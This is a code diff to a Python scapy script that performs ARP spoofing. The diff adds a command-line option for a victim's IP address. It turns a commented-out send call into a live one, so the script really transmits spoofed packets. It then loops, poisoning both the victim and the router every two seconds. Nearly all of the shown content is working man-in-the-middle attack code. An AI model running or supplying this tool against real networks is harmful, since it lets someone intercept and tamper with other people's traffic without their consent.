@@ -3,7 +3,23 @@
 import os
 import sys
 import time
+import argparse
 import scapy.all as scapy
+
+
+def get_arguments():
+    # Parse the passed arguments
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("-t", "--target", dest="target", help="Target's IP address (example: 192.168.0.154)")
+
+    arguments = parser.parse_args()
+
+    if not arguments.target:
+        parser.error("[-] Missing -t argument (--target), please use --help for more details.")
+
+    return arguments
+
 
 def get_router_ip(opsys):
     if opsys == "Linux":
@@ -43,7 +59,7 @@ def spoof(target_ip,spoof_ip):
     print(packet.summary())
     print(packet.show())
 
-    # scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
 def check_os():
@@ -63,14 +79,19 @@ def check_os():
         return "Other"
 
 
+options     = get_arguments()
 os.system('clear')
 opsys       = check_os()
 
-print("[+] This is your router's IP:")
+print("[+] Your router's IP:")
 router_ip   = get_router_ip(opsys)
+print("[+] Your target's IP:")
+victim_ip = options.target
+print(victim_ip)
 
 while True:
     # send spoof packets continuously to router and victim
-    spoof("192.168.1.5",router_ip)
-    spoof(router_ip,"192.168.1.5")
+    spoof(victim_ip,router_ip)
+    spoof(router_ip,victim_ip)
+    print("[+] Sent two spoof packets")
     time.sleep(2)
